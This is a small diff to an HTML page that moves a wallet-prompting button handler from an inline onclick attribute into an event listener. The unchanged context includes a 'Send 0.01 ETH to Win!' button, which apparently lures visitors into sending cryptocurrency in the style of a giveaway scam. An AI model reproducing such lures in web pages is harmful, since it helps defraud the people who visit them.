@@ -67,9 +67,15 @@
     }
   </script>
   <center>
-    <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptWallet()">
+    <!-- Added id to the button -->
+    <input type="button" id="openBingButton" class="button" value="From Original Site">
     <br>
     <button class="button" onclick="sendTransaction()">Send 0.01 ETH to Win!</button>
   </center>
+  
+  <script>
+    // Attach a click event handler to the button with the specified id
+    document.getElementById('openBingButton').addEventListener('click', openBingAndPromptWallet);
+  </script>
 </body>
 </html>
